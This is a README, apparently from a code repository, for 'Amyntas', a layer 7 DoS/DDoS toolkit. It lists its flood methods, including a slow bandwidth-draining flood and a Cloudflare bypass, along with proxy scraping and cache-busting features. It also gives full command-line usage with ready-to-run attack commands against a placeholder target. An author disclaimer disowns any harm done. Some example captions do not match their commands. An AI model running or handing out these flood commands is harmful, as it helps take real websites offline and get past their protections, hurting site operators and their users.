## NOTE!
Results may vary A LOT when attacking! <br>
It might peak at 40k rq/s and drop down to 2k rq/s or peak at 169 requests per second, just so you know! <bn>

--- 

### About
Amyntas is a layer 7 DoS/DDoS toolkit, with a variety of attack methods and the capability to bypass caching systems. <br>
Use at your own risk! I, the author, am not responsible for any harm you do! Keep that in mind!

<br>

Aviable methods
- `GET` (simple GET flood)
- `HEAD` (simple HEAD flood)
- `POST` (simple POST flood)
- `FAST` (a <strong>GET /</strong> flood)
- `GHP`/`GETHEADPOST` (a flood which randomly chooses GET, HEAD or POST as request method)
- `LEECH` (a low & slow HTTP GET flood which can drain A LOT of bandwith)
- `MIX` (a method which randomly chooses HTTP request methods)
- `BYPASS` (bypasses cloudflare)
- `PROXY` (attack which uses a proxy file to attack)

---

### Features
1. Proxy scraper
2. Cache bypassing mechanisms
3. Random headers (user agents, referers)
4. Real time "worker" system
5. Supports custom user-agent and referer
6. Proxy support (Rotating proxy support coming soon!)

---

### Known bugs/problems
1. None ATM :3

---

### To Do list
1. More methods
2. More documentation
3. Better exception handling
4. Maybe colors? lol

---

### Usage
All options:
```
-h, --help                             Show this help message and exit
-t TARGET, --target TARGET             Target URL (Example: https://google.com or http://pornhub.com)
-p PORT, --port PORT                   Target port (Leave empty to let the tool decide)
-d DURATION, --duration DURATION       Attack duration
--proxy-file FILE_PATH                 Path to proxies
--proxy PROXY                          Use a proxy when attacking (Example: 127.0.0.1:1337)
--proxy-type PROXY_TYPE                Set the proxy type (HTTP, SOCKS4 or SOCKS5)
--proxy-user PROXY_USER                Proxy username
--proxy-pass PROXY_PASS                Proxy password
--proxy-resolve                        Resolve host using proxy (needed for hidden service targets)
-rt, --rotate-proxies                  Wether we should rotate proxies (use with `--proxy-file`)
-ua USERAGENT, --user-agent USERAGENT  User agent to use when attacking, else its randomly chosen
-ref REFERER, --referer REFERER        Referer to use when attacking, else its randomly chosen
-w WORKERS, --workers WORKERS          Amount of workers/threads to use when attacking
-dbg, --debug                          Print info useful for debugging
-bc, --bypass-cache                    Try to bypass any caching systems to ensure we hit the main site
-m METHOD, --method METHOD             Method to use when attacking (default: GET)
-dfw, --detect-firewall                Detect if the target site is protected by a firewall
--http-version HTTP_VERSION            Set the HTTP protocol version (default: 1.1)
--scrape-proxies                       Wether to scrape a list of proxies first (set the type using `--proxy-type`)
```

Basic usage:
```
python3 amyntas.py -t https://target.com
```

GET flood, attacking with 100 threads for 1337 seconds:
```
python3 amyntas.py -t https://target.com -w 700 -d 1337
```

POST flood, attacking with 700 threads for 40 seconds:
```
python3 amyntas.py -t https://target.com -w 700 -m POST -d 40
```

Proxified GET flood using a file with SOCKS5 proxies, with 1337 threads for 40 seconds
```
python3 amyntas.py --proxy-file socks5.txt --proxy-type SOCKS5 -t https://target.com -w 1337 -d 40 -m PROXY
```

Raw GET flood, using HTTP protocol version 430 with 999 threads for 999 seconds
```
python3 amyntas.py --http-version 430 -m GET -w 999 -d 999 -t https://target.com:420
```

---

### Requirements

```
requests
argparse
colorama
netaddr
cloudscraper
selenium
undetected_chromedriver
ssl
```

---

### Images
<p>3.8k GET flood using 2300 threads</p>

![image](https://user-images.githubusercontent.com/78029616/164300794-c4b850ba-37d0-41e0-a62f-53f7578ff731.png)